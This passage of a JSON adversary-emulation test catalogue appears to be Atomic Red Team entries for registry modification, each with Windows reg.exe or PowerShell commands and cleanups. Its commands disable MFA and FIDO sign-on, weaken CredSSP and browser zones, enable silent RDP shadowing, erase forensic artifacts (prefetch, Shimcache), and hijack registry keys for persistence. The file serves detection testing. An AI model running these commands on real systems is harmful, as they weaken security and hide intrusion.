                        "description": "This test simulates an adversary modifying the Internet Zone Protocol Defaults in the registry of the currently logged-in user using the reg.exe utility via the command prompt. Such modifications can be indicative of an adversary trying to weaken browser security settings. Upon execution, if successful, the message \"The operation completed successfully.\" will be displayed.\nTo verify the effects of the test:\n1. Open the Registry Editor (regedit.exe).\n2. Navigate to \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\".\n3. Check for the presence of the \"http\" and \"https\" DWORD values set to `0`.\nOr run:\n```batch\nreg query \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\"\n```\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v http /t REG_DWORD /d 0 /F\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v https /t REG_DWORD /d 0 /F\n",
                            "cleanup_command": "reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v http /t REG_DWORD /d 3 /F\nreg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v https /t REG_DWORD /d 3 /F\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Modify Internet Zone Protocol Defaults in Current User Registry - PowerShell",
                        "auto_generated_guid": "b1a4d687-ba52-4057-81ab-757c3dc0d3b5",
                        "description": "This test simulates an adversary modifying the Internet Zone Protocol Defaults in the registry of the currently logged-in user using PowerShell. Such modifications can be indicative of an adversary attempting to weaken browser security settings. \nTo verify the effects of the test:\n1. Open the Registry Editor (regedit.exe).\n2. Navigate to \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\".\n3. Check for the presence of the \"http\" and \"https\" DWORD values set to `0`.\nOr run:\n```powershell\nGet-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' | Select-Object http,https\n```\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "# Set the registry values for http and https to 0\nSet-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' -Name 'http' -Value 0\nSet-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' -Name 'https' -Value 0\n",
                            "cleanup_command": "# Restore the registry values for http and https to 3\nSet-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' -Name 'http' -Value 3\nSet-ItemProperty -Path 'HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults' -Name 'https' -Value 3\n",
                            "name": "powershell"
                        }
                    },
                    {
                        "name": "Activities To Disable Secondary Authentication Detected By Modified Registry Value.",
                        "auto_generated_guid": "c26fb85a-fa50-4fab-a64a-c51f5dc538d5",
                        "description": "Detect the disable secondary authentication activities that adversary attempt to bypass MFA and to get the unauthorized access to the system or sensitive data.\nSee the related article (https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.SecondaryAuthenticationFactor::MSSecondaryAuthFactor_AllowSecondaryAuthenticationDevice).\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\SecondaryAuthenticationFactor\" /v \"AllowSecondaryAuthenticationDevice\" /t REG_DWORD /d 0 /f\n",
                            "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\SecondaryAuthenticationFactor\" /v \"AllowSecondaryAuthenticationDevice\" /t REG_DWORD /d 1 /f\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Activities To Disable Microsoft [FIDO Aka Fast IDentity Online] Authentication Detected By Modified Registry Value.",
                        "auto_generated_guid": "ffeddced-bb9f-49c6-97f0-3d07a509bf94",
                        "description": "Detect the Microsoft FIDO authentication disable activities that adversary attempt to gains access to login credentials (e.g., passwords), they may be able to impersonate the user and access sensitive accounts or data and also increases the risk of falling victim to phishing attacks.\nSee the related article (https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.FidoAuthentication::AllowFidoDeviceSignon).\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FIDO\" /v \"AllowExternalDeviceSignon\" /t REG_DWORD /d 0 /f\n",
                            "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FIDO\" /v \"AllowExternalDeviceSignon\" /t REG_DWORD /d 1 /f\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Scarab Ransomware Defense Evasion Activities",
                        "auto_generated_guid": "ca8ba39c-3c5a-459f-8e15-280aec65a910",
                        "description": "Scarab Ransomware defense evasion activities that can abuse the registry values to modify the settings of the Credential Security Support Provider to overcome potential RDP connection issues.\n[Scarab Ransomware Article](https://www.welivesecurity.com/en/eset-research/scarabs-colon-izing-vulnerable-servers/)\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters\" /v AllowEncryptionOracle /t REG_DWORD /d 2 /f\n",
                            "cleanup_command": "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters\" /v AllowEncryptionOracle /t REG_DWORD /d 0 /f\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Disable Remote Desktop Anti-Alias Setting Through Registry",
                        "auto_generated_guid": "61d35188-f113-4334-8245-8c6556d43909",
                        "description": "A modification registry to disable RDP anti-alias settings. This technique was seen in DarkGate malware as part of its installation\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /v \"DisableRemoteDesktopAntiAlias\" /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg add \"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /v \"DisableRemoteDesktopAntiAlias\" /t REG_DWORD /d 0 /f\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Disable Remote Desktop Security Settings Through Registry",
                        "auto_generated_guid": "4b81bcfa-fb0a-45e9-90c2-e3efe5160140",
                        "description": "A modification registry to disable RDP security settings. This technique was seen in DarkGate malware as part of its installation\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /v \"DisableSecuritySettings\" /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg add \"HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /v \"DisableSecuritySettings\" /t REG_DWORD /d 0 /f\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Disabling ShowUI Settings of Windows Error Reporting (WER)",
                        "auto_generated_guid": "09147b61-40f6-4b2a-b6fb-9e73a3437c96",
                        "description": "A modification registry to disable ShowUI settings of Windows Error Report. This registry setting can influence the behavior of error reporting dialogs or prompt box. \nThis technique was seen in DarkGate malware as part of its installation.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\Windows Error Reporting\" /v DontShowUI /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\Windows Error Reporting\" /v DontShowUI /t REG_DWORD /d 0 /f\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Enable Proxy Settings",
                        "auto_generated_guid": "eb0ba433-63e5-4a8c-a9f0-27c4192e1336",
                        "description": "A modification registry to enable proxy settings. This technique was seen in DarkGate malware as part of its installation.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyEnable /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyEnable /t REG_DWORD /d 0 /f\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Set-Up Proxy Server",
                        "auto_generated_guid": "d88a3d3b-d016-4939-a745-03638aafd21b",
                        "description": "A modification registry to setup proxy server. This technique was seen in DarkGate malware as part of its installation.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyServer /t REG_SZ /d \"proxy.atomic-test.com:8080\" /f\n",
                            "cleanup_command": "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v ProxyServer /f\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "RDP Authentication Level Override",
                        "auto_generated_guid": "7e7b62e9-5f83-477d-8935-48600f38a3c6",
                        "description": "A modification registry to override RDP Authentication Level. This technique was seen in DarkGate malware as part of its installation.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKCU\\Software\\Microsoft\\Terminal Server Client\" /v AuthenticationLevelOverride /t REG_DWORD /d 0 /f\n",
                            "cleanup_command": "reg delete \"HKCU\\Software\\Microsoft\\Terminal Server Client\" /v AuthenticationLevelOverride\n",
                            "name": "command_prompt"
                        }
                    },
                    {
                        "name": "Enable RDP via Registry (fDenyTSConnections)",
                        "auto_generated_guid": "16bdbe52-371c-4ccf-b708-79fba61f1db4",
                        "description": "Modify the registry value of fDenyTSConnections to allow incoming RDP connections. \nThis activity has been observed by multiple ransomware groups, including Hive ransomware. \n[Reference](https://www.rapid7.com/blog/post/2023/01/11/increasing-the-sting-of-hive-ransomware/)\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "remove_rdp_access_during_cleanup": {
                                "description": "Set to 1 if you want the cleanup to remove RDP access to machine",
                                "type": "integer",
                                "default": "0"
                            }
                        },
                        "executor": {
                            "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
                            "cleanup_command": "if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /f >nul 2>&1)",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Disable Windows Prefetch Through Registry",
                        "auto_generated_guid": "7979dd41-2045-48b2-a54e-b1bc2415c9da",
                        "description": "Modify the registry of the machine to disable prefetch. Disabling prefetch will remove one artifact for evidence of application execution. Restart is required post modification\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters\" /v \"EnablePrefetcher\" /t REG_DWORD /d 0 /f\n",
                            "cleanup_command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters\" /v \"EnablePrefetcher\" /t REG_DWORD /d 3 /f\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Setting Shadow key in Registry for RDP Shadowing",
                        "auto_generated_guid": "ac494fe5-81a4-4897-af42-e774cf005ecb",
                        "description": "Microsoft Remote Desktop Protocol (RDP) supports a “shadowing” feature and RDP is available in all Windows Server Operating Systems and the business editions of end-user Windows versions.\nIn order to use the RDP shadowing feature, the Remote Desktop Services (TermService) service needs to be running (which it does by default), a rule needs to be enabled in the Windows Firewall and in case of stealth reasons, a setting needs to be configured to not prompt the user for permission when they are being shadowed.\nIn order to configure RDP shadowing session in a quiet mode.  The registry of a remote system can be updated using several protocols, depending on the accessible ports and configuration of the services listening on those ports. Our aim is to set the Shadow value in HKLM\\Software\\Policies\\Microsoft\\Windows NT\\Terminal Services on the remote machine to 2, which allows us to both view and control the session without the user being informed.\n[Reference](https://blog.bitsadmin.com/spying-on-users-using-rdp-shadowing)",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "server_name": {
                                "description": "The remote server that we need to shadow and have to do the registry modification.",
                                "type": "string",
                                "default": "localhost"
                            }
                        },
                        "executor": {
                            "command": "$s= New-CimSession -Computername #{server_name} -SessionOption (New-CimSessionOption -Protocol Dcom)\nGet-CimInstance -Namespace ROOT\\StandardCimv2 -ClassName MSFT_NetFirewallRule -Filter 'DisplayName=\"Remote Desktop - Shadow (TCP-In)\"' -CimSession $s | Invoke-CimMethod -MethodName Enable\nInvoke-CimMethod -ClassName StdRegProv -MethodName SetDWORDValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=\"Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\"; sValueName=\"shadow\"; uValue=[uint32]2} -CimSession $s",
                            "cleanup_command": "Invoke-CimMethod -ClassName StdRegProv -MethodName DeleteValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName=\"Software\\Policies\\Microsoft\\Windows NT\\Terminal Services\"; sValueName=\"Shadow\"} -CimSession $s\n",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Flush Shimcache",
                        "auto_generated_guid": "ecbd533e-b45d-4239-aeff-b857c6f6d68b",
                        "description": "The ShimCache is a component in Windows operating systems that stores information about recently executed applications. It is used by the operating system to speed up the launching process of applications. The ShimCache is also used by IR teams and Forensic teams. Forensic investigators can use the ShimCache to determine which programs have been executed on a system, even if they have been deleted or their logs have been cleared.Reference : https://blueteamops.medium.com/shimcache-flush-89daff28d15e",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "Rundll32.exe apphelp.dll,ShimFlushCache",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Disable Windows Remote Desktop Protocol",
                        "auto_generated_guid": "5f8e36de-37ca-455e-b054-a2584f043c06",
                        "description": "Modify the registry of the machine to disable remote desktop protocol.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg delete \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /f\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Enforce Smart Card Authentication Through Registry",
                        "auto_generated_guid": "4c4bf587-fe7f-448f-ba8d-1ecec9db88be",
                        "description": "Enforce Smart Card Authentication Through Registry\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v scforceoption /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v scforceoption /f\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Requires the BitLocker PIN for Pre-boot authentication",
                        "auto_generated_guid": "26fc7375-a551-4336-90d7-3f2817564304",
                        "description": "Requires the BitLocker PIN for Pre-boot authentication\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseAdvancedStartup /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseAdvancedStartup /f\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Modify EnableBDEWithNoTPM Registry entry",
                        "auto_generated_guid": "bacb3e73-8161-43a9-8204-a69fe0e4b482",
                        "description": "Allow BitLocker without a compatible TPM (requires a password)\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v EnableBDEWithNoTPM /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg delete \"\"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\"\" /v EnableBDEWithNoTPM /f\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Modify UseTPM Registry entry",
                        "auto_generated_guid": "7c8c7bd8-0a5c-4514-a6a3-0814c5a98cf0",
                        "description": "Use Trusted Platform Module (TPM) for Bitlocker tool\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseTPM /t REG_DWORD /d 2 /f\n",
                            "cleanup_command": "reg delete \"\"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\"\" /v UseTPM /f\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Modify UseTPMPIN Registry entry",
                        "auto_generated_guid": "10b33fb0-c58b-44cd-8599-b6da5ad6384c",
                        "description": "Allow startup PIN with TPM for Bitlocker tool\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseTPMPIN /t REG_DWORD /d 2 /f\n",
                            "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseTPMPIN /f\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Modify UseTPMKey Registry entry",
                        "auto_generated_guid": "c8480c83-a932-446e-a919-06a1fd1e512a",
                        "description": "Allow startup key with TPM for Bitlocker tool\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseTPMKey /t REG_DWORD /d 2 /f\n",
                            "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseTPMKey /f\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Modify UseTPMKeyPIN Registry entry",
                        "auto_generated_guid": "02d8b9f7-1a51-4011-8901-2d55cca667f9",
                        "description": "Allow startup key and PIN with TPM for Bitlocker tool\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseTPMKeyPIN /t REG_DWORD /d 2 /f\n",
                            "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UseTPMKeyPIN /f\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Modify EnableNonTPM Registry entry",
                        "auto_generated_guid": "e672a340-a933-447c-954c-d68db38a09b1",
                        "description": "Allow Bitlocker without TPM for Bitlocker tool\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v EnableNonTPM /t REG_DWORD /d 1 /f\n",
                            "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v EnableNonTPM /f\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Modify UsePartialEncryptionKey Registry entry",
                        "auto_generated_guid": "b5169fd5-85c8-4b2c-a9b6-64cc0b9febef",
                        "description": "Allow startup key with TPM for Bitlocker tool\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UsePartialEncryptionKey /t REG_DWORD /d 2 /f\n",
                            "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UsePartialEncryptionKey /f\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Modify UsePIN Registry entry",
                        "auto_generated_guid": "3ac0b30f-532f-43c6-8f01-fb657aaed7e4",
                        "description": "Allow startup PIN with TPM for Bitlocker tool\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UsePIN /t REG_DWORD /d 2 /f\n",
                            "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\" /v UsePIN /f\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Abusing Windows TelemetryController Registry Key for Persistence",
                        "auto_generated_guid": "4469192c-2d2d-4a3a-9758-1f31d937a92b",
                        "description": "The Windows Compatibility Telemetry system makes use of the CompatTelRunner.exe binary to run a variety of telemetry tasks. It relies on the registry for instructions on which commands to run. \nIt will run any arbitrary command without restriction of location or type. Blog :https://www.trustedsec.com/blog/abusing-windows-telemetry-for-persistence\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "new_key": {
                                "description": "New Registry Key Added",
                                "type": "string",
                                "default": "NewKey"
                            },
                            "new_executable": {
                                "description": "Custom Executable to run",
                                "type": "string",
                                "default": "C:\\Windows\\System32\\notepad.exe"
                            }
                        },
                        "executor": {
                            "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\#{new_key}\" /t REG_SZ /v Command /d #{new_executable} /f\n",
                            "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\TelemetryController\\#{new_key}\" /f\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Modify RDP-Tcp Initial Program Registry Entry",
                        "auto_generated_guid": "c691cee2-8d17-4395-b22f-00644c7f1c2d",
                        "description": "If the fInheritInitialProgram value is set to 1, the exe indicated in the InitialProgram value is automatically started on RDP connection.\nOnce the test commands are run, notepad will execute automatically on new RDP connection\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v fInheritInitialProgram /t REG_DWORD /d 1 /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v InitialProgram /t REG_SZ /d \"C:\\Windows\\System32\\notepad.exe\" /f\n",
                            "cleanup_command": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v InitialProgram /t REG_SZ /d \"\" /f\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Abusing MyComputer Disk Cleanup Path for Persistence",
                        "auto_generated_guid": "f2915249-4485-42e2-96b7-9bf34328d497",
                        "description": "Replacing the registry settings with custom executable will end up with the replacement programs being executed at the time OS will decide to kick off the respective activity\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\cleanuppath\" /t REG_EXPAND_SZ /d \"%systemroot%\\system32\\notepad.exe\" /f\n",
                            "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\cleanuppath\" /t REG_EXPAND_SZ /d \"%SystemRoot%\\System32\\cleanmgr.exe /D %c\" /f\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Abusing MyComputer Disk Fragmentation Path for Persistence",
                        "auto_generated_guid": "3235aafe-b49d-451b-a1f1-d979fa65ddaf",
                        "description": "Replacing the registry settings with custom executable will end up with the replacement programs being executed at the time OS will decide to kick off the respective activity\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\DefragPath\" /t REG_EXPAND_SZ /d \"%systemroot%\\system32\\notepad.exe\" /f\n",
                            "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\DefragPath\" /t REG_EXPAND_SZ /d \"%systemroot%\\system32\\dfrgui.exe\" /f\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Abusing MyComputer Disk Backup Path for Persistence",
                        "auto_generated_guid": "599f3b5c-0323-44ed-bb63-4551623bf675",
                        "description": "Replacing the registry settings with custom executable will end up with the replacement programs being executed at the time OS will decide to kick off the respective activity\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\BackupPath\" /t REG_EXPAND_SZ /d \"%systemroot%\\system32\\notepad.exe\" /f\n",
                            "cleanup_command": "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\BackupPath\" /t REG_EXPAND_SZ /d \"%SystemRoot%\\system32\\sdclt.exe\" /f\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Adding custom paths for application execution",
                        "auto_generated_guid": "573d15da-c34e-4c59-a7d2-18f20d92dfa3",
                        "description": "As per Microsoft,the entries found under App Paths are used primarily to map an application’s executable file name to that file’s fully qualified path and to pre-pend information to the PATH environment variable on a per-application, per-process basis. \nThe path can be modified to load a custom application of choice. \nPost the registry changes of this test, when someone tries to manually run msedge.exe via StartMenu/Run window , notepad will be launched.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "app_name": {
                                "description": "path of application to be modified",
                                "type": "string",
                                "default": "msedge.exe"
                            },
                            "new_path": {
                                "description": "New App Path Added",
                                "type": "string",
                                "default": "C:\\Windows\\System32\\notepad.exe"
                            }
                        },
                        "executor": {
                            "command": "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\#{app_name}\" /t REG_SZ /d #{new_path} /f\n",
                            "cleanup_command": "reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\#{app_name}\" /v (Default) /f\nreg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\#{app_name}\" /t REG_SZ /d \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" /f\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    }
                ]
            }
        ]
    },
    "timestamp": "2025-02-28 13:06:14"
}